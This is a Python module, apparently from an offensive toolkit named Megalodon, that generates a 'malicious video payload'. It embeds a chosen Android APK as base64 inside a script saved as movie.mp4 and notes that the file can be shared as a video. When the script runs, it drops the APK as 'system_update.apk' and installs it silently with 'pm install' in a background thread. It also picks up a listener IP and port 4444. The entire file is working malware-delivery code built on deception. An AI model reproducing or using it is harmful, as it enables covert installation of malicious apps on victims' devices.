import os
import json
import time
import base64
import shutil
from pathlib import Path
import subprocess

class VideoPayload:
    
    def __init__(self):
        self.output_dir = Path(__file__).parent.parent.parent / 'payloads' / 'videos'
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.target_apk = None
    
    def select_apk(self):
        """Prompt user to manually enter APK path or browse"""
        print("\n📱 SELECT APK TO EMBED IN VIDEO")
        print("=" * 50)
        print("Options:")
        print("  1. Enter full path to APK file")
        print("  2. Browse common locations")
        print("  3. Use default APK (payloads/android/build/megalodon.apk)")
        print("  4. Cancel")
        print("=" * 50)
        
        choice = input("\nSelect option (1-4): ").strip()
        
        if choice == '1':
            apk_path = input("Enter full path to APK: ").strip()
            apk_path = os.path.expanduser(apk_path)
            if os.path.exists(apk_path) and apk_path.endswith('.apk'):
                self.target_apk = Path(apk_path)
                print(f"[+] APK selected: {self.target_apk.name}")
                print(f"[+] Size: {self.target_apk.stat().st_size / 1024:.1f} KB")
                return True
            else:
                print("[-] Invalid APK path or file not found")
                return False
        
        elif choice == '2':
            return self.browse_locations()
        
        elif choice == '3':
            default_path = Path(__file__).parent.parent.parent / 'payloads' / 'android' / 'build' / 'megalodon.apk'
            if default_path.exists():
                self.target_apk = default_path
                print(f"[+] APK selected: {self.target_apk.name}")
                print(f"[+] Size: {self.target_apk.stat().st_size / 1024:.1f} KB")
                return True
            else:
                print("[-] Default APK not found. Build one first: payload build-apk")
                return False
        
        elif choice == '4':
            print("[-] APK selection cancelled")
            return False
        
        else:
            print("[-] Invalid option")
            return False
    
    def browse_locations(self):
        """Browse common APK locations"""
        locations = [
            ('Megalodon default', '~/Megalodon/payloads/android/build/megalodon.apk'),
            ('Current directory', './'),
            ('Downloads', '~/Downloads/'),
            ('Desktop', '~/Desktop/'),
            ('Android storage', '/storage/emulated/0/'),
            ('SD Card', '/sdcard/'),
            ('User home', '~/'),
            ('Enter custom path', 'custom'),
        ]
        
        print("\n📂 BROWSE APK LOCATIONS")
        print("=" * 50)
        for i, (name, path) in enumerate(locations, 1):
            print(f"  {i}. {name} ({path})")
        print("=" * 50)
        
        choice = input("\nSelect location (1-8): ").strip()
        
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(locations):
                name, path = locations[idx]
                if path == 'custom':
                    custom_path = input("Enter custom path: ").strip()
                    path = os.path.expanduser(custom_path)
                
                path = os.path.expanduser(path)
                
                if os.path.isdir(path):
                    return self.list_apks_in_dir(path)
                elif os.path.isfile(path) and path.endswith('.apk'):
                    self.target_apk = Path(path)
                    print(f"[+] APK selected: {self.target_apk.name}")
                    print(f"[+] Size: {self.target_apk.stat().st_size / 1024:.1f} KB")
                    return True
                else:
                    print(f"[-] Path not found or not an APK: {path}")
                    return False
            else:
                print("[-] Invalid selection")
                return False
        except ValueError:
            print("[-] Invalid input")
            return False
    
    def list_apks_in_dir(self, directory):
        """List all APK files in a directory"""
        dir_path = Path(directory)
        if not dir_path.exists():
            print(f"[-] Directory not found: {directory}")
            return False
        
        apks = list(dir_path.glob('*.apk'))
        if not apks:
            print(f"[-] No APK files found in {directory}")
            return False
        
        print(f"\n📦 APK FILES IN {directory}")
        print("=" * 50)
        for i, apk in enumerate(apks, 1):
            size = apk.stat().st_size / 1024
            print(f"  {i}. {apk.name} ({size:.1f} KB)")
        print("=" * 50)
        
        choice = input("\nSelect APK number (or 'b' to go back): ").strip()
        
        if choice.lower() == 'b':
            return self.browse_locations()
        
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(apks):
                self.target_apk = apks[idx]
                print(f"[+] APK selected: {self.target_apk.name}")
                print(f"[+] Size: {self.target_apk.stat().st_size / 1024:.1f} KB")
                return True
            else:
                print("[-] Invalid selection")
                return False
        except ValueError:
            print("[-] Invalid input")
            return False
    
    def generate(self, target_os='android'):
        """Generate video with embedded APK"""
        
        if not self.select_apk():
            return {'success': False, 'error': 'No APK selected'}
        
        print("[*] Generating malicious video payload...")
        
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 1))
            listener_ip = s.getsockname()[0]
            s.close()
        except:
            listener_ip = '0.0.0.0'
        
        config_file = Path('config/megalodon.json')
        if config_file.exists():
            with open(config_file, 'r') as f:
                config = json.load(f)
                listener_port = config.get('listener', {}).get('port', 4444)
        else:
            listener_port = 4444
        
        if target_os == 'android':
            return self.generate_android_video(listener_ip, listener_port)
        else:
            return self.generate_android_video(listener_ip, listener_port)
    
    def generate_android_video(self, listener_ip, listener_port):
        """Generate Android video with embedded APK"""
        
        output_file = self.output_dir / 'movie.mp4'
        
        with open(self.target_apk, 'rb') as f:
            apk_data = f.read()
            apk_b64 = base64.b64encode(apk_data).decode('utf-8')
        
        payload = f'''#!/usr/bin/env python3
# Megalodon Video Payload with Embedded APK

import base64
import os
import subprocess
import sys
import tempfile
from pathlib import Path

APK_DATA = """{apk_b64}"""

def extract_and_install():
    try:
        apk_bytes = base64.b64decode(APK_DATA)
        temp_dir = Path(tempfile.gettempdir())
        apk_path = temp_dir / 'system_update.apk'
        
        with open(apk_path, 'wb') as f:
            f.write(apk_bytes)
        
        os.chmod(str(apk_path), 0o755)
        
        if sys.platform == 'android':
            subprocess.Popen(['pm', 'install', '-r', str(apk_path)], 
                           stdout=subprocess.DEVNULL, 
                           stderr=subprocess.DEVNULL)
        else:
            downloads = Path.home() / 'Downloads'
            shutil.copy(apk_path, downloads / 'system_update.apk')
            print(f"[+] APK saved to {downloads / 'system_update.apk'}")
        
        return True
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

if __name__ == "__main__":
    import threading
    thread = threading.Thread(target=extract_and_install, daemon=True)
    thread.start()
    sys.exit(0)
'''
        
        with open(output_file, 'w') as f:
            f.write(payload)
        
        print(f"[+] Video payload generated!")
        print(f"[+] Location: {output_file}")
        print(f"[+] Embedded APK: {self.target_apk.name}")
        print(f"[+] Size: {output_file.stat().st_size / 1024:.1f} KB")
        print("\n[!] This file can be renamed to .mp4 and shared")
        print("[!] When opened, it extracts and installs the APK silently")
        
        return {
            'success': True,
            'payload_file': str(output_file),
            'embedded_apk': str(self.target_apk),
            'type': 'video',
            'platform': 'android',
            'listener_ip': listener_ip,
            'listener_port': listener_port,
            'message': 'Video payload with embedded APK generated'
        }

def generate(target_os='android'):
    generator = VideoPayload()
    return generator.generate(target_os)
